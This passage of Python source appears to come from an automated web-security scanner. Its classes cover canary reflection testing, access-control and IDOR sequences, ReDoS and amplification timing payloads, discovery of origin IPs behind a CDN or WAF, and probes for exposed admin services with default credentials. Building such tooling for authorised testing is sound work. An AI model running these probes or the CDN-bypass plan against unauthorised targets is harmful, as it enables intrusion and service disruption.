                profile.security_awareness = "medium"
            else:
                profile.experience_level = "junior"
                profile.security_awareness = "low"
        else:
            profile.experience_level = "unknown"
            profile.security_awareness = "unknown"

        # Architecture style from URL patterns
        if api_patterns:
            patterns_str = " ".join(api_patterns)
            if "/api/v" in patterns_str:
                profile.architecture_style = "versioned_api"
            elif "/graphql" in patterns_str:
                profile.architecture_style = "graphql"
            elif any("/service/" in p or "/svc/" in p for p in api_patterns):
                profile.architecture_style = "microservice"
            else:
                profile.architecture_style = "monolith"

        # Target type influence
        if target_type == "startup":
            profile.likely_mistakes.extend([
                "Rapid development -- security review likely skipped",
                "Staging environments likely accessible",
                "API keys potentially hardcoded in frontend",
            ])
        elif target_type == "legacy_system":
            profile.likely_mistakes.extend([
                "Unpatched CVEs in old framework versions",
                "Legacy auth mechanisms (basic auth, session cookies without flags)",
                "Mixed HTTP/HTTPS with no HSTS",
            ])

        return profile

    def predict_vulnerabilities(self, profile: DeveloperProfile) -> list[str]:
        """Predict likely vulnerabilities based on developer profile."""
        predictions = list(profile.likely_mistakes)

        # Add experience-level predictions
        if profile.experience_level == "junior":
            predictions.extend([
                "SQL injection in custom query builders",
                "XSS in template rendering (unsanitized output)",
                "IDOR via sequential IDs without access checks",
                "Secrets in client-side JavaScript or .env files",
                "Missing input validation on file uploads",
            ])
        elif profile.experience_level == "mid":
            predictions.extend([
                "Business logic flaws (race conditions, state manipulation)",
                "Inconsistent authorization between web UI and API",
                "SSRF via URL parameters or webhook configurations",
                "JWT algorithm confusion or weak secrets",
            ])
        elif profile.experience_level == "senior":
            predictions.extend([
                "Second-order injection (stored payloads triggered later)",
                "Race conditions in concurrent operations",
                "Cache poisoning via header injection",
                "OAuth state parameter misuse or redirect manipulation",
            ])

        return predictions[:15]


# ---------------------------------------------------------------------------
# 6. Response Echo Analysis
# ---------------------------------------------------------------------------

class ResponseEchoAnalyzer:
    """Send a canary, find where it appears.

    One unique string tests FOUR vulnerability classes simultaneously:
    1. Reflected = potential XSS
    2. In error messages = information disclosure
    3. In a later response = stored injection
    4. Transformed (encoded, truncated) = filter analysis

    No scanner does this. Scanners test one vuln class per payload.
    The canary tests all of them in one request.
    """

    @staticmethod
    def generate_canary() -> str:
        """Generate a unique canary string that's easy to grep for."""
        import uuid
        token = uuid.uuid4().hex[:12]
        return f"DAENA_{token}_CANARY"

    def build_canary_probes(
        self,
        target_urls: list[str],
        canary: str | None = None,
    ) -> list[dict[str, Any]]:
        """Build probe requests that inject the canary into various input channels."""
        if not canary:
            canary = self.generate_canary()

        probes = []
        for url in target_urls[:5]:
            base = url.rstrip("/")

            # Query parameter injection
            probes.append({
                "url": f"{base}?q={canary}",
                "method": "GET",
                "injection_point": "query_param",
                "canary": canary,
            })
            # Path injection
            probes.append({
                "url": f"{base}/{canary}",
                "method": "GET",
                "injection_point": "path",
                "canary": canary,
            })
            # Header injection
            probes.append({
                "url": base,
                "method": "GET",
                "injection_point": "header",
                "canary": canary,
                "headers": {"X-Custom-Header": canary, "Referer": f"https://{canary}.com"},
            })
            # POST body injection
            probes.append({
                "url": base,
                "method": "POST",
                "injection_point": "body",
                "canary": canary,
                "body": f"input={canary}&search={canary}",
            })

        return probes

    def analyze_echo(
        self,
        canary: str,
        probe: dict[str, Any],
        response_body: str,
        response_headers: dict[str, str],
        status_code: int,
    ) -> list[dict[str, Any]]:
        """Analyze where the canary appears in a response."""
        findings = []
        body_lower = response_body.lower()
        canary_lower = canary.lower()

        # Direct reflection (XSS candidate)
        if canary in response_body:
            context = self._extract_context(response_body, canary)
            findings.append({
                "type": "reflected_input",
                "severity": "high" if "<" in context or ">" in context else "medium",
                "description": (
                    f"Input reflected in response body at {probe.get('injection_point')}. "
                    f"Context: {context[:100]}. Potential XSS vector."
                ),
                "injection_point": probe.get("injection_point"),
                "context": context[:200],
            })

        # Canary in error message
        if canary_lower in body_lower and status_code >= 400:
            findings.append({
                "type": "error_reflection",
                "severity": "medium",
                "description": (
                    f"Input reflected in error response ({status_code}). "
                    f"Error messages may reveal internal processing details."
                ),
                "injection_point": probe.get("injection_point"),
            })

        # Canary in response headers (header injection)
        for hdr_name, hdr_val in response_headers.items():
            if canary in hdr_val:
                findings.append({
                    "type": "header_injection",
                    "severity": "high",
                    "description": (
                        f"Input reflected in response header '{hdr_name}'. "
                        f"Header injection can lead to response splitting, "
                        f"cache poisoning, or cookie manipulation."
                    ),
                    "injection_point": probe.get("injection_point"),
                    "header": hdr_name,
                })

        # Partial/transformed canary (filter analysis)
        canary_parts = [canary[:6], canary[6:]]
        for part in canary_parts:
            if part in response_body and canary not in response_body:
                findings.append({
                    "type": "partial_reflection",
                    "severity": "low",
                    "description": (
                        f"Input partially reflected (truncated or filtered). "
                        f"Part '{part}' found but full canary absent. "
                        f"Indicates input processing that may be bypassable."
                    ),
                    "injection_point": probe.get("injection_point"),
                })
                break

        return findings

    @staticmethod
    def _extract_context(body: str, canary: str, window: int = 50) -> str:
        """Extract the context around where the canary appears."""
        idx = body.find(canary)
        if idx == -1:
            return ""
        start = max(0, idx - window)
        end = min(len(body), idx + len(canary) + window)
        return body[start:end]


# ---------------------------------------------------------------------------
# 7. State Machine Inference
# ---------------------------------------------------------------------------

class StateMachineInferrer:
    """Infer the target's state machine by testing action sequences.

    Most tools test individual endpoints. But applications have STATE.
    After login, you can do X. After logout, you shouldn't be able to.
    After payment, you can access content. Without payment, you can't.

    By testing sequences, we find:
    - Broken access control (action works after logout)
    - State manipulation (skip payment step, still get content)
    - Race conditions (two requests in parallel produce invalid state)
    """

    def generate_sequences(
        self,
        target: str,
        known_endpoints: list[str],
    ) -> list[list[dict[str, Any]]]:
        """Generate test sequences to probe state machine behavior."""
        if not target.startswith("http"):
            target = f"https://{target}"
        base = target.rstrip("/")

        sequences = []

        # Sequence 1: Access protected resource without authentication
        sequences.append([
            {"name": "access_without_auth", "method": "GET",
             "url": f"{base}/api/v1/users", "expect": "reject",
             "description": "Access protected resource without authentication"},
        ])

        # Sequence 2: Authentication flow validation
        if any("login" in ep.lower() or "auth" in ep.lower() for ep in known_endpoints):
            sequences.append([
                {"name": "login", "method": "POST",
                 "url": f"{base}/login", "expect": "redirect_or_token",
                 "description": "Authenticate"},
                {"name": "access_protected", "method": "GET",
                 "url": f"{base}/api/v1/users", "expect": "success",
                 "description": "Access protected resource while authenticated"},
                {"name": "logout", "method": "POST",
                 "url": f"{base}/logout", "expect": "success",
                 "description": "Terminate session"},
                {"name": "access_after_logout", "method": "GET",
                 "url": f"{base}/api/v1/users", "expect": "reject",
                 "description": "Access protected resource after logout (should fail)"},
            ])

        # Sequence 3: Direct object reference escalation
        sequences.append([
            {"name": "access_own_resource", "method": "GET",
             "url": f"{base}/api/v1/users/1", "expect": "success",
             "description": "Access own resource (user ID 1)"},
            {"name": "access_other_resource", "method": "GET",
             "url": f"{base}/api/v1/users/2", "expect": "reject_or_different",
             "description": "Access another user's resource (IDOR test)"},
        ])

        # Sequence 4: Method override
        if known_endpoints:
            first_ep = known_endpoints[0] if known_endpoints[0].startswith("http") else f"{base}{known_endpoints[0]}"
            sequences.append([
                {"name": "get_resource", "method": "GET",
                 "url": first_ep, "expect": "success",
                 "description": "Normal GET request"},
                {"name": "delete_resource", "method": "DELETE",
                 "url": first_ep, "expect": "reject",
                 "description": "Attempt DELETE (should be restricted)"},
                {"name": "put_resource", "method": "PUT",
                 "url": first_ep, "expect": "reject",
                 "description": "Attempt PUT (should be restricted)"},
            ])

        return sequences

    def analyze_sequence_results(
        self,
        sequence: list[dict[str, Any]],
        results: list[dict[str, Any]],
    ) -> list[dict[str, Any]]:
        """Analyze sequence results for state machine violations."""
        findings = []

        for step, result in zip(sequence, results):
            expected = step.get("expect", "")
            actual_status = result.get("status_code", 0)
            step_name = step.get("name", "")

            # Check for broken access control
            if expected == "reject" and 200 <= actual_status < 300:
                findings.append({
                    "type": "state_violation",
                    "severity": "critical" if "after_logout" in step_name else "high",
                    "step_name": step_name,
                    "expected": expected,
                    "actual_status": actual_status,
                    "description": (
                        f"State violation: '{step.get('description')}' returned {actual_status} "
                        f"when rejection was expected. "
                        f"{'Session not properly invalidated after logout.' if 'logout' in step_name else 'Access control bypass detected.'}"
                    ),
                    "url": step.get("url", ""),
                })

            # Check for IDOR (different content for different user IDs)
            if "other_resource" in step_name and 200 <= actual_status < 300:
                findings.append({
                    "type": "idor",
                    "severity": "high",
                    "step_name": step_name,
                    "actual_status": actual_status,
                    "description": (
                        f"IDOR: Accessed another user's resource at {step.get('url')} "
                        f"and received {actual_status}. Access control not enforced per-resource."
                    ),
                    "url": step.get("url", ""),
                })

        return findings


# ---------------------------------------------------------------------------
# 8. Cost Amplification Detection
# ---------------------------------------------------------------------------

class CostAmplificationDetector:
    """Find endpoints where small requests cause disproportionate server work.

    A search query that takes 5 seconds = potential ReDoS.
    A GraphQL query resolving 1000 nested objects = amplification.
    A file upload endpoint with no size limit = resource exhaustion.

    We DON'T exploit these. We DETECT and REPORT them. The proof is
    the timing difference, not the denial of service.
    """

    # Payloads designed to trigger amplification if vulnerable
    AMPLIFICATION_PROBES: list[dict[str, Any]] = [
        {
            "name": "regex_dos",
            "description": "Test for ReDoS via exponential backtracking",
            "param": "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
            "detection": "timing",
            "threshold_ms": 3000,
        },
        {
            "name": "deep_nesting",
            "description": "Test for JSON parsing amplification",
            "body": '{"a":' * 50 + '1' + '}' * 50,
            "detection": "timing",
            "threshold_ms": 2000,
        },
        {
            "name": "large_array",
            "description": "Test for array processing amplification",
            "body": '{"items":' + str(list(range(10000))) + '}',
            "detection": "timing",
            "threshold_ms": 2000,
        },
        {
            "name": "graphql_depth",
            "description": "Test for GraphQL query depth amplification",
            "body": '{"query": "{ __schema { types { fields { type { fields { type { name } } } } } } }"}',
            "detection": "timing",
            "threshold_ms": 3000,
        },
    ]

    def build_timing_probes(
        self,
        target_urls: list[str],
    ) -> list[dict[str, Any]]:
        """Build timing-based amplification detection probes."""
        probes = []
        for url in target_urls[:3]:
            base = url.rstrip("/")
            for amp_probe in self.AMPLIFICATION_PROBES:
                probe = {
                    "url": base,
                    "method": "POST" if "body" in amp_probe else "GET",
                    "probe_name": amp_probe["name"],
                    "description": amp_probe["description"],
                    "threshold_ms": amp_probe["threshold_ms"],
                }
                if "param" in amp_probe:
                    probe["url"] = f"{base}?q={amp_probe['param']}"
                    probe["method"] = "GET"
                if "body" in amp_probe:
                    probe["body"] = amp_probe["body"]
                    probe["headers"] = {"Content-Type": "application/json"}
                probes.append(probe)
        return probes

    def analyze_timing(
        self,
        probe: dict[str, Any],
        response_time_ms: int,
        baseline_ms: int,
    ) -> dict[str, Any] | None:
        """Analyze if a probe triggered amplification based on timing."""
        threshold = probe.get("threshold_ms", 3000)
        amplification_factor = response_time_ms / max(baseline_ms, 1)

        if response_time_ms > threshold and amplification_factor > 5:
            return {
                "type": "cost_amplification",
                "severity": "medium",
                "probe_name": probe["probe_name"],
                "description": (
                    f"{probe['description']}: Response took {response_time_ms}ms "
                    f"(baseline: {baseline_ms}ms, {amplification_factor:.1f}x amplification). "
                    f"This endpoint may be vulnerable to resource exhaustion."
                ),
                "url": probe["url"],
                "response_time_ms": response_time_ms,
                "baseline_ms": baseline_ms,
                "amplification_factor": amplification_factor,
            }
        return None


# ---------------------------------------------------------------------------
# 9. Origin IP Discovery (bypass CDN/WAF)
# ---------------------------------------------------------------------------

class OriginIPDiscovery:
    """Find the real server IP behind CDN/WAF (Cloudflare, Akamai, etc.).

    The CDN is the armor. The origin IP is the skin underneath.
    If you find it, you bypass ALL CDN protection in one step.

    Methods:
    - Historical DNS: DNS records before CDN migration (SecurityTrails, ViewDNS)
    - Email headers: when the server sends email, the origin IP is in Received headers
    - SSL certificate: search Censys/Shodan for the same cert fingerprint
    - IPv6: many configure CDN for IPv4 but forget IPv6
    - Subdomains: cdn protects www but not mail, ftp, staging
    - DNS rebinding: if the origin accepts requests for the domain directly

    ALL METHODS USE PUBLIC INFORMATION ONLY.
    """

    # Subdomains that often bypass CDN (not behind Cloudflare etc.)
    _BYPASS_SUBDOMAINS: list[str] = [
        "mail", "smtp", "imap", "pop", "pop3",
        "ftp", "sftp",
        "staging", "stage", "dev", "test", "qa", "uat",
        "api", "api2", "api-internal",
        "admin", "panel", "dashboard",
        "old", "legacy", "backup", "bak",
        "direct", "origin", "real",
        "vpn", "remote", "rdp",
        "git", "gitlab", "jenkins", "ci", "cd",
        "grafana", "kibana", "prometheus", "monitoring",
        "sentry", "logs", "elk",
        "db", "database", "mysql", "postgres", "redis", "mongo",
        "mq", "rabbitmq", "kafka",
        "internal", "intranet", "corp",
    ]

    def generate_bypass_targets(self, domain: str) -> list[dict[str, str]]:
        """Generate subdomain targets that might bypass CDN."""
        targets = []
        for sub in self._BYPASS_SUBDOMAINS:
            targets.append({
                "hostname": f"{sub}.{domain}",
                "reason": f"'{sub}' subdomain often not behind CDN",
                "category": self._categorize_subdomain(sub),
            })
        return targets

    def analyze_email_headers(self, raw_headers: str) -> list[str]:
        """Extract origin IPs from email Received headers.

        When a server sends email (password reset, notifications),
        the Received headers contain the ORIGIN IP, not the CDN IP.
        """
        ips = []
        # Match IP addresses in Received headers
        received_lines = [
            line for line in raw_headers.split("\n")
            if line.strip().lower().startswith("received")
        ]
        ip_pattern = r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b'
        for line in received_lines:
            matches = re.findall(ip_pattern, line)
            for ip in matches:
                # Filter out private/localhost IPs
                if not ip.startswith(("127.", "10.", "192.168.", "172.16.", "0.")):
                    if ip not in ips:
                        ips.append(ip)
        return ips

    def generate_origin_check_plan(self, domain: str, cdn: str) -> list[dict[str, Any]]:
        """Generate a plan to discover the origin IP."""
        plan = []

        # Step 1: Check bypass subdomains
        plan.append({
            "step": "Resolve bypass subdomains",
            "action": "dns_resolve",
            "targets": [f"{s}.{domain}" for s in self._BYPASS_SUBDOMAINS[:15]],
            "reason": "Subdomains like mail, staging, dev often point to origin IP, not CDN",
        })

        # Step 2: Check IPv6 (often not behind CDN)
        plan.append({
            "step": "Check IPv6 records",
            "action": "dns_resolve_aaaa",
            "targets": [domain],
            "reason": f"Many {cdn} configurations only proxy IPv4, IPv6 goes to origin",
        })

        # Step 3: Trigger email from target
        plan.append({
            "step": "Trigger email from target",
            "action": "trigger_email",
            "methods": [
                "Password reset (if target has accounts)",
                "Contact form submission",
                "Newsletter signup",
                "Bug report email",
            ],
            "reason": "Email Received headers contain the origin server IP",
        })

        # Step 4: Historical DNS
        plan.append({
            "step": "Check historical DNS",
            "action": "historical_dns",
            "apis": [
                "SecurityTrails API (free tier)",
                "ViewDNS.info",
                "DNSHistory.org",
            ],
            "reason": f"DNS records before {cdn} migration reveal the origin IP",
        })

        # Step 5: SSL certificate search
        plan.append({
            "step": "Search for SSL cert on other IPs",
            "action": "cert_search",
            "apis": [
                "Censys.io (search for cert with same CN)",
                "Shodan (search for ssl.cert.subject.CN:domain)",
            ],
            "reason": "The origin server uses the same SSL cert. Find other IPs serving that cert.",
        })

        return plan

    @staticmethod
    def _categorize_subdomain(sub: str) -> str:
        if sub in ("mail", "smtp", "imap", "pop", "pop3"):
            return "email"
        elif sub in ("staging", "stage", "dev", "test", "qa", "uat"):
            return "staging"
        elif sub in ("git", "gitlab", "jenkins", "ci", "cd"):
            return "ci_cd"
        elif sub in ("grafana", "kibana", "prometheus", "monitoring", "sentry", "logs", "elk"):
            return "monitoring"
        elif sub in ("db", "database", "mysql", "postgres", "redis", "mongo"):
            return "database"
        elif sub in ("admin", "panel", "dashboard"):
            return "admin"
        elif sub in ("old", "legacy", "backup", "bak"):
            return "legacy"
        return "infrastructure"


# ---------------------------------------------------------------------------
# 10. Forgotten Infrastructure Scanner
# ---------------------------------------------------------------------------

class ForgottenInfraScanner:
    """Find infrastructure the target forgot about.

    The main site is hardened. But what about:
    - The staging server from 2 years ago (still running, debug mode on)
    - The old API version (deprecated but not decommissioned)
    - The Jenkins server (no auth, public build logs)
    - The Grafana dashboard (anonymous access enabled)
    - The Sentry instance (error reports with stack traces)
    - The .git directory on the old server

    These are the doors nobody locked because nobody remembers they exist.
    """

    # Common forgotten services and their default ports/paths
    _FORGOTTEN_SERVICES: list[dict[str, Any]] = [
        {"name": "Jenkins", "paths": ["/jenkins", ":8080", ":8443"], "check": "Jenkins-Crumb",
         "risk": "Unauthenticated access to build pipelines, secrets in build logs"},
        {"name": "Grafana", "paths": ["/grafana", ":3000"], "check": "grafana",
         "risk": "Anonymous access to monitoring data, internal metrics exposed"},
        {"name": "Kibana", "paths": ["/kibana", ":5601"], "check": "kibana",
         "risk": "Log data exposed, may contain tokens/PII/internal IPs"},
        {"name": "Sentry", "paths": ["/sentry", ":9000"], "check": "sentry",
         "risk": "Error reports with stack traces, file paths, and environment variables"},
        {"name": "Prometheus", "paths": ["/prometheus", ":9090/metrics", "/metrics"], "check": "prometheus",
         "risk": "Internal metrics, service discovery, infrastructure topology"},
        {"name": "phpMyAdmin", "paths": ["/phpmyadmin", "/pma", "/myadmin"], "check": "phpMyAdmin",
         "risk": "Database admin panel, often with weak/default credentials"},
        {"name": "Adminer", "paths": ["/adminer", "/adminer.php"], "check": "adminer",
         "risk": "Lightweight DB admin, often left accessible"},
        {"name": "Redis Commander", "paths": [":8081", "/redis-commander"], "check": "redis",
         "risk": "Unauthenticated access to Redis data and commands"},
        {"name": "Elasticsearch", "paths": [":9200", ":9200/_cat/indices"], "check": "elasticsearch",
         "risk": "Full-text search data exposed, may contain sensitive documents"},
        {"name": "Docker Registry", "paths": [":5000/v2/_catalog"], "check": "repositories",
         "risk": "Container images exposed, may contain secrets and source code"},
        {"name": "Kubernetes Dashboard", "paths": [":8443", "/api/v1/namespaces"], "check": "kubernetes",
         "risk": "Full cluster access if dashboard is unauthenticated"},
        {"name": "MinIO Console", "paths": [":9001", ":9000"], "check": "minio",
         "risk": "Object storage exposed, may contain backups and uploads"},
        {"name": "Jupyter Notebook", "paths": [":8888", "/lab"], "check": "jupyter",
         "risk": "Code execution environment, often without password"},
        {"name": "RabbitMQ Management", "paths": [":15672"], "check": "rabbitmq",
         "risk": "Message queue admin panel, default guest/guest credentials"},
    ]

    def generate_forgotten_probes(self, domain: str) -> list[dict[str, Any]]:
        """Generate probes for forgotten infrastructure."""
        probes = []
        for service in self._FORGOTTEN_SERVICES:
            for path in service["paths"]:
                if path.startswith(":"):
                    # Port-based probe
                    port = path.split(":")[1].split("/")[0]
                    url_path = "/" + "/".join(path.split("/")[1:]) if "/" in path else "/"
                    probes.append({
                        "service": service["name"],
                        "url": f"https://{domain}{path}" if "/" in path else None,
                        "host": domain,
                        "port": int(port),
                        "path": url_path,
                        "check_string": service["check"],
                        "risk": service["risk"],
                        "type": "port",
                    })
                else:
                    # Path-based probe
                    probes.append({
                        "service": service["name"],
                        "url": f"https://{domain}{path}",
                        "check_string": service["check"],
                        "risk": service["risk"],
                        "type": "path",
                    })
        return probes

    def analyze_probe_result(
        self,
        probe: dict[str, Any],
        status_code: int,
        body: str,
        headers: dict[str, str],
    ) -> dict[str, Any] | None:
        """Analyze if a forgotten service was found."""
        check = probe.get("check_string", "").lower()

        # Service found if: 200 response AND check string appears
        if status_code == 200:
            body_lower = body.lower()
            headers_str = str(headers).lower()
            if check in body_lower or check in headers_str:
                return {
                    "type": "forgotten_infrastructure",
                    "service": probe["service"],
                    "url": probe.get("url", f"{probe.get('host', '')}:{probe.get('port', '')}"),
                    "severity": "high",
                    "info": {
                        "name": f"Forgotten: {probe['service']} exposed",
                        "severity": "high",
                        "description": (
                            f"{probe['service']} found at {probe.get('url', 'target')}. "
                            f"Risk: {probe['risk']}"
                        ),
                    },
                    "risk": probe["risk"],
                }

        # Some services redirect (302) to login -- still means they exist
        if status_code in (301, 302) and check in str(headers).lower():
            return {
                "type": "forgotten_infrastructure",
                "service": probe["service"],
                "url": probe.get("url", ""),
                "severity": "medium",
                "info": {
                    "name": f"Forgotten: {probe['service']} exists (auth required)",
                    "severity": "medium",
                    "description": (
                        f"{probe['service']} detected at {probe.get('url', 'target')} "
                        f"(redirects to login). Service exists but may require authentication. "
                        f"Risk if credentials are weak: {probe['risk']}"
                    ),
                },
            }

        return None
